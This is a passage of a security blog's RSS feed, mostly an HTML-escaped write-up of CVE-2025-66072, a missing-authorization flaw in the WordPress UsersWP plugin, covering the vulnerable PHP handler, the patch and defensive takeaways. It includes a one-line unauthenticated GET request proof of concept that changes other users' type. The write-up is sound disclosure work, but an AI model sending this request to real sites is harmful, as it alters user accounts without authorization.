id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/directorist/vulnerability/wordpress-directorist-plugin-8-5-2-missing-authorization-to-authenticated-subscriber-data-export-and-slug-update-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Directorist Plugin &amp;lt;= 8.5.2 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-66072 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-12-cve-2025-66072/</link>
      <pubDate>Fri, 12 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-12-cve-2025-66072/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-12-cve-2025-66072/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Missing Authorization&lt;/strong&gt; vulnerability in &lt;strong&gt;Stiofan UsersWP&lt;/strong&gt; allows exploitation of &lt;strong&gt;Incorrectly Configured Access Control Security Levels&lt;/strong&gt;. This issue affects &lt;strong&gt;UsersWP&lt;/strong&gt;: from &lt;strong&gt;n/a&lt;/strong&gt; to &lt;strong&gt;&amp;lt;= 1.2.47&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-66072&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-66072&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Broken Access Control&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.2.47&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.2.48&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.3)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/userswp/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress UsersWP Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;UsersWP&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.2.47&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.2.48&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers an action hook:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action( &amp;#39;admin_init&amp;#39;, array( $this, &amp;#39;handle_bulk_user_type_change&amp;#39; ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;admin_init&lt;/code&gt; runs whenever any logged-in user accesses the admin dashboard (&lt;code&gt;/wp-admin/&lt;/code&gt;), but it is also triggered in endpoints like &lt;strong&gt;&lt;code&gt;admin-ajax.php&lt;/code&gt;&lt;/strong&gt; and &lt;strong&gt;&lt;code&gt;admin-post.php&lt;/code&gt;&lt;/strong&gt;. Because these endpoints are accessible by &lt;strong&gt;unauthenticated users&lt;/strong&gt;, in some conditions, an unauthenticated user can trigger &lt;code&gt;admin_init&lt;/code&gt; even without visiting the admin dashboard.&lt;/p&gt;&#xA;&lt;p&gt;This means that any user sending a request to &lt;code&gt;admin-ajax.php&lt;/code&gt; or &lt;code&gt;admin-post.php&lt;/code&gt; will trigger the &lt;code&gt;admin_init&lt;/code&gt; hook, which in turn calls the &lt;code&gt;handle_bulk_user_type_change&lt;/code&gt; callback.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function handle_bulk_user_type_change() {&#xA;    if ( ! isset( $_GET[&amp;#39;uwp_change_user_type&amp;#39;], $_GET[&amp;#39;uwp_new_user_type&amp;#39;] ) ) {&#xA;        return;&#xA;    }&#xA;&#xA;    $new_user_type = absint( $_GET[&amp;#39;uwp_new_user_type&amp;#39;] );&#xA;&#xA;    if ( ! $new_user_type ) {&#xA;        return;&#xA;    }&#xA;&#xA;    $users = isset( $_REQUEST[&amp;#39;users&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $_REQUEST[&amp;#39;users&amp;#39;] ) ? (array) $_REQUEST[&amp;#39;users&amp;#39;] : array();&#xA;&#xA;    if ( ! empty( $users ) ) {&#xA;        array_map( function( $user_id ) use ( $new_user_type ) {&#xA;            update_user_meta( absint( $user_id ), &amp;#39;_uwp_register_form_id&amp;#39;, (int) $new_user_type );&#xA;        }, $users );&#xA;    } &#xA;&#xA;    wp_safe_redirect( add_query_arg( &amp;#39;user_type_updated&amp;#39;, &amp;#39;true&amp;#39;, admin_url( &amp;#39;users.php&amp;#39; ) ) );&#xA;    exit;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function checks whether the request contains &lt;code&gt;uwp_change_user_type&lt;/code&gt; and &lt;code&gt;uwp_new_user_type&lt;/code&gt;; if not, it exits.&lt;/p&gt;&#xA;&lt;p&gt;If present, it retrieves &lt;code&gt;uwp_new_user_type&lt;/code&gt; from &lt;code&gt;$_GET&lt;/code&gt; and converts it to a positive integer. If the value is invalid, the function exits.&lt;/p&gt;&#xA;&lt;p&gt;Next, it retrieves the users list from &lt;code&gt;$_REQUEST[&#39;users&#39;]&lt;/code&gt;. If the array is not empty, it executes &lt;code&gt;update_user_meta()&lt;/code&gt; for each user, updating &lt;code&gt;_uwp_register_form_id&lt;/code&gt; with &lt;code&gt;$new_user_type&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;Finally, it redirects to &lt;code&gt;users.php&lt;/code&gt; with &lt;code&gt;user_type_updated=true&lt;/code&gt; and ends execution.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-12-cve-2025-66072/type.png&#34; title=&#34;User Type List&#34; data-thumbnail=&#34;/posts/2025-12-12-cve-2025-66072/type.png&#34; data-sub-html=&#34;&lt;h2&gt;User Type&lt;/h2&gt;&lt;p&gt;User Type List&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-12-cve-2025-66072/type.png&#39; alt=&#34;User Type&#34; height=&#34;338&#34; width=&#34;747&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;User Type List&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Bug&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;The vulnerability occurs due to the lack of any capability/permission checks.&lt;/strong&gt; This allows any user—including non-admin users—to call the endpoint and change the User Type of any user, even though this action should be restricted to admins.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Patch (v1.2.48):&lt;/strong&gt; adds to the &lt;code&gt;handle_bulk_user_type_change&lt;/code&gt; function:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Nonce verification: The function requires &lt;code&gt;_wpnonce&lt;/code&gt; to exist and be valid for the &lt;code&gt;&#39;bulk-users&#39;&lt;/code&gt; action.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! isset( $_GET[&amp;#39;_wpnonce&amp;#39;] ) || ! wp_verify_nonce( $_GET[&amp;#39;_wpnonce&amp;#39;], &amp;#39;bulk-users&amp;#39; ) ) {&#xA;    wp_die( __( &amp;#39;Security check failed. Please try again.&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;&#xA;&lt;li&gt;Capability check: Only users with the &lt;code&gt;edit_users&lt;/code&gt; capability are allowed to perform this action.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! current_user_can( &amp;#39;edit_users&amp;#39; ) ) {&#xA;    wp_die( __( &amp;#39;You do not have permission to perform this action.&amp;#39; ) );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-12-cve-2025-66072/diff.png&#34; title=&#34;Diff code&#34; data-thumbnail=&#34;/posts/2025-12-12-cve-2025-66072/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Diff code&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-12-cve-2025-66072/diff.png&#39; alt=&#34;Diff&#34; height=&#34;568&#34; width=&#34;1865&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Diff code&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;A[&amp;#34;Any user (including Unauthenticated)&amp;#34;] --&amp;gt; B[&amp;#34;Send request to admin-ajax.php or admin-post.php with uwp_change_user_type &amp;#43; uwp_new_user_type&amp;#34;]&#xA;B --&amp;gt; C[&amp;#34;Hook admin_init is triggered&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Callback handle_bulk_user_type_change() executes&amp;#34;]&#xA;D --&amp;gt; E{&amp;#34;Are required GET parameters present?&amp;#34;}&#xA;E -- No --&amp;gt; F[&amp;#34;Function exits&amp;#34;]&#xA;E -- Yes --&amp;gt; G[&amp;#34;Retrieve uwp_new_user_type from $_GET&amp;#34;]&#xA;G --&amp;gt; H{&amp;#34;Is uwp_new_user_type a valid integer?&amp;#34;}&#xA;H -- No --&amp;gt; F&#xA;H -- Yes --&amp;gt; I[&amp;#34;Retrieve users list from $_REQUEST[&amp;#39;users&amp;#39;]&amp;#34;]&#xA;I --&amp;gt; J{&amp;#34;Is users list not empty?&amp;#34;}&#xA;J -- No --&amp;gt; F&#xA;J -- Yes --&amp;gt; K[&amp;#34;update_user_meta() for each user in the list&amp;#34;]&#xA;K --&amp;gt; L[&amp;#34;Redirect to users.php?user_type_updated=true&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;User Type changed without any capability check&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Send a request as an unauthenticated user:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;GET /wp-admin/admin-post.php?uwp_change_user_type=2&amp;amp;uwp_new_user_type=user_type_id&amp;amp;users[]=uid_1&amp;amp;users[]=uid_2 HTTP/1.1&#xA;Host: localhost&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;CVE-2025-66072 arises from the &lt;strong&gt;lack of authorization checks&lt;/strong&gt; in the &lt;code&gt;handle_bulk_user_type_change()&lt;/code&gt; function of UsersWP &amp;lt;= 1.2.47. This allows &lt;strong&gt;any user, including unauthenticated users&lt;/strong&gt;, to change the User Type of other users by sending crafted requests to &lt;code&gt;admin-ajax.php&lt;/code&gt; or &lt;code&gt;admin-post.php&lt;/code&gt;. The patch in version 1.2.48 mitigates the issue by enforcing &lt;strong&gt;nonce verification&lt;/strong&gt; and &lt;strong&gt;capability checks&lt;/strong&gt;, restricting the action to authorized users only.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Always perform &lt;strong&gt;capability checks&lt;/strong&gt; (&lt;code&gt;current_user_can&lt;/code&gt;) when handling sensitive actions in WordPress.&lt;/li&gt;&#xA;&lt;li&gt;Use &lt;strong&gt;nonces&lt;/strong&gt; to prevent unauthorized or forged requests.&lt;/li&gt;&#xA;&lt;li&gt;Do not rely solely on hooks like &lt;code&gt;admin_init&lt;/code&gt;; ensure all public endpoints validate both &lt;strong&gt;permissions&lt;/strong&gt; and &lt;strong&gt;request authenticity&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;Low-privileged or unauthenticated users can exploit endpoints if proper access control is missing.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/broken-access-control/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Broken Access Control&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/userswp/vulnerability/wordpress-userswp-plugin-1-2-47-broken-access-control-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress UsersWP Plugin &amp;lt;= 1.2.47 is vulnerable to Broken Access Control&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11368 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-11-cve-2025-11368/</link>
      <pubDate>Thu, 11 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-11-cve-2025-11368/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-11-cve-2025-11368/app.jpg&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  